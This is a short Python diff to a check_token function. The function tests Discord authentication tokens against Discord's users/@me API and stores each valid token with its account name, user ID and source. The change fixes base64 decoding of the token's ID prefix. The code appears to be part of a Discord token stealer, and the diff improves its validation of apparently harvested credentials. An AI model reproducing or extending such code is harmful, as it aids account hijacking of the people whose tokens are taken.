@@ -65,10 +65,10 @@ def fetch():
     def check_token(tkn, name, ids:list, to_return_tokens:list):
         r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(tkn))
         if r.status_code == 200:
-            tknid = base64.b64encode(tkn.split('.')[0].encode('ascii')).decode('ascii')
+            tknid = base64.b64decode((tkn.split('.')[0] + '===').encode('ascii')).decode('ascii')
             if (tknid+name) not in ids:
                 req = reqJSON(r)
-                to_return_tokens.append([token, f"{req['username']}#{req['discriminator']}", tkn.split('.')[0], name])
+                to_return_tokens.append([token, f"{req['username']}#{req['discriminator']}", tknid, name])
                 ids.append(tknid+name)
 
         return ids, to_return_tokens
